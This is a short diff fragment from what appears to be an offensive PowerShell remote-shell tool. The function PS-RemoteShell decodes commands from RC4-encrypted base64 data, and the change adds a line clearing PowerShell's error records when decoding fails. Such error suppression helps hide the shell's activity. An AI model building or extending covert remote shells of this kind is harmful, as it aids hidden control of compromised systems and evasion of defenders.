@@ -161,6 +161,7 @@ function PS-RemoteShell {
 				$Cmd = RC4-DecodeBase64 -Buffer $Data -Key $Key
 			} Catch {
 				$Cmd = ""
+				$error.Clear()
 			}
 			
 			$InternalCmd = $Cmd.Split(" ", 2)
